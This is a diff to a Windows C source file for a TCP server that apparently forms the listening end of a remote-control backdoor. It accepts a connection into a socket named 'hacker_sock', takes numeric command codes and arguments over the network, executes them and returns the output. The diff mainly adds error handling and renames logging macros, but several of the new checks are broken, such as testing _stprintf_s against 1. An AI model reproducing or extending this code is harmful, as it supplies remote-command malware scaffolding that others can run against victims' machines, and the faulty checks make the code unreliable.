@@ -1,11 +1,11 @@
-#include <tchar.h>  // _tprintf
+#include "Server.h"
+#include "Commands.h"
+#include "..\Tools.h"
+#include "..\Debugger.h"
+#include "..\Constants.h"
+
 #include <stdlib.h> // wcstombs_s
 #include <stdio.h>  // sscanf_s
-
-#include "Server.h"
-#include "Tools.h"
-#include "Commands.h"
-#include "..\Debugger.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -19,7 +19,7 @@ SOCKET InitTCPServer()
 
 		return INVALID_SOCKET;
 	}
-	$info _tprintf(TEXT("Startup finished\n"));
+	$i _tprintf(TEXT("Startup finished\n"));
 
 	SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (listen_sock == INVALID_SOCKET)
@@ -31,8 +31,8 @@ SOCKET InitTCPServer()
 		return INVALID_SOCKET;
 	}
 
-	SOCKADDR_IN addr_sock;
-	addr_sock.sin_family       = AF_INET;
+	SOCKADDR_IN addr_sock = { 0 };
+	addr_sock.sin_family      = AF_INET;
 	addr_sock.sin_addr.s_addr = htonl(INADDR_ANY);
 	addr_sock.sin_port        = htons(DEFAULT_PORT);
 	if (bind(listen_sock, (LPSOCKADDR)&addr_sock, sizeof(addr_sock)) == SOCKET_ERROR)
@@ -44,7 +44,7 @@ SOCKET InitTCPServer()
 
 		return INVALID_SOCKET;
 	}
-	$info _tprintf(TEXT("Binding socket finished\n"));
+	$i _tprintf(TEXT("Binding socket finished\n"));
 
 	if (listen(listen_sock, 1) == SOCKET_ERROR)
 	{
@@ -55,7 +55,7 @@ SOCKET InitTCPServer()
 
 		return INVALID_SOCKET;
 	}
-	$info _tprintf(TEXT("Socket started to listen\n"));
+	$i _tprintf(TEXT("Socket started to listen\n"));
 
 	return listen_sock;
 }
@@ -68,7 +68,7 @@ VOID RunServer(SOCKET listen_sock)
 		 args[ARGS_LENGTH]    = { 0 };
 	while (TRUE)
 	{
-		$info _tprintf(TEXT("Waiting for the client\n"));
+		$i _tprintf(TEXT("Waiting for the client\n"));
 
 		SOCKET hacker_sock = accept(listen_sock, NULL, NULL);
 		if (hacker_sock == INVALID_SOCKET)
@@ -78,7 +78,7 @@ VOID RunServer(SOCKET listen_sock)
 			return;
 		}
 
-		$info _tprintf(TEXT("Connected\n"));
+		$i _tprintf(TEXT("Connected\n"));
 		while (TRUE)
 		{
 			INT bytes = recv(hacker_sock, cmd, CMD_LENGTH, 0);
@@ -88,7 +88,15 @@ VOID RunServer(SOCKET listen_sock)
 				break;
 
 			INT code = UNDEFINEDCMD;
-			sscanf_s(cmd, "%d", &code);
+			if (sscanf_s(cmd, "%d", &code) != 1)
+			{
+				$e _tprintf(TEXT("Cannot get cmd code(%hs)\n"), cmd);
+
+				send(hacker_sock, TASK_FAILUREA, TASK_FAILURE_LENGTH, 0);
+
+				break;
+			}
+
 			if (code == UNDEFINEDCMD)
 			{
 				$e _tprintf(TEXT("Undefined cmd code(%hs)\n"), cmd);
@@ -99,29 +107,43 @@ VOID RunServer(SOCKET listen_sock)
 			}
 
 			TCHAR targs[ARGS_LENGTH] = { 0 };
-			_stprintf_s(targs, ARGS_LENGTH, TEXT("%hs"), args);
+			if (_stprintf_s(targs, ARGS_LENGTH, TEXT("%hs"), args) != 1)
+			{
+				$e _tprintf(TEXT("Cannot convert args to TCHAR\n"), cmd);
+
+				send(hacker_sock, TASK_FAILUREA, TASK_FAILURE_LENGTH, 0);
+
+				break;
+			}
 
 			CONST PTCHAR tresult = ExecuteCommand(code, targs);
 			
 			char result[RESULT_LENGTH] = { 0 };
 			size_t retval = 0;
-			wcstombs_s(&retval, result, RESULT_LENGTH, tresult, RESULT_LENGTH - 1);
+			if (wcstombs_s(&retval, result, RESULT_LENGTH, tresult, RESULT_LENGTH - 1) != 0)
+			{
+				$e _tprintf(TEXT("Cannot convert tresult to CHAR\n"), cmd);
 
-			$info _tprintf(TEXT("Sending answer(%hs)\n"), result);
+				send(hacker_sock, TASK_FAILUREA, TASK_FAILURE_LENGTH, 0);
+
+				break;
+			}
+
+			$i _tprintf(TEXT("Sending answer(%hs)\n"), result);
 			send(hacker_sock, result, RESULT_LENGTH, 0);
 		}
 		
 		closesocket(hacker_sock);
 
-		$info _tprintf(TEXT("Client disconnected\n"));
+		$i _tprintf(TEXT("Client disconnected\n"));
 		SleepEx(10000, FALSE);
 		ClearConsole();
 	}
 }
 
-CONST PTCHAR ExecuteCommand(INT code, const PTCHAR args)
+CONST PTCHAR ExecuteCommand(INT code, CONST PTCHAR args)
 {
-	_tprintf(TEXT("cmd:'%d', args:'%ws'\n"), code, args);
+	$i _tprintf(TEXT("cmd:'%d', args:'%ws'\n"), code, args);
 
 	static TCHAR result[RESULT_LENGTH] = { 0 }; // I do not want to allocate and deallocate memory
 	for (size_t i = 0; i < NUMBER_OF_COMMANDS; ++i)
